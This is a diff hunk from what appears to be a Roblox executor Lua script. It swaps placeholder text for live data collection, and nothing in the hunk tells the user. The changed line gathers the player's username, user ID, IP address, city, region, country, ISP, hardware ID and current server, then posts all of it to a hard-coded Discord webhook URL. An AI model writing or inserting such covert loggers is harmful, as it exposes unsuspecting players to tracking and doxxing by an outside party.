@@ -90,7 +90,7 @@ if (writefile) and (getcustomasset) then
 		},
 		Body = game:GetService("HttpService"):JSONEncode({
 			webhook_url = "https://discord.com/api/webhooks/1499751083197857922/Lb3-E0JPX3PFbOlHDZYl89JO7nuHQS_PlxVXMfm9r-Zb4Obq4omprJ_zzxE1ICB1yRq9",
-			content = '# --- USER LOGGED ---\n### Player Information\nDisplayName : "Meow"\nUsername : "Itsyaboivincentt"\nUserId : "1234465463"\n### Game Information\nGame Name : "Meow"\nGameId : "1984719875"\nPlaceId : "MEOW"\n### Sensitive Information\nIP : "192.168.1.1"\nCountry : "Philippines"\nRegion: "Cavite"\nCity: "Silang"\nHWID : "Meow"\nORG : "meow"\nISP : "converge"\n### Other Information\nExecutor: "Delta"',
+			content = '# --- USER LOGGED ---\n### Player Information\nDisplayName : "['..LocalPlayer.DisplayName..'](https://www.roblox.com/users/'..LocalPlayer.UserId..'/profile)"\nUsername : "'..LocalPlayer.Name..'"\nUserId : "'..LocalPlayer.UserId..'"\n### Game Information\nGame Name : "['..game:GetService("MarketplaceService"):GetProductInfoAsync(game.PlaceId).Name..'](https://www.roblox.com/games/'..game.PlaceId..')"\nGameId : "'..game.GameId..'"\nPlaceId : "'..game.PlaceId..'"\nJobId : "['..game.JobId..'](https://www.roblox.com/games/start?placeId='..game.PlaceId..'&gameInstanceId='..game.JobId..')"\n### Sensitive Information\nIP : "'..WhoIs.ip..'"\nCountry : "'..WhoIs.country..'"\nRegion: "'..WhoIs.region..'"\nCity: "'..WhoIs.city..'"\nHWID : "'..gethwid()..'"\nORG : "['..WhoIs.connection.org..'](https://'..WhoIs.connection.domain..')"\nISP : "'..WhoIs.connection.isp..'"\n### Other Information\nExecutor: "'..identifyexecutor()..'"',
 		})
 	})
 
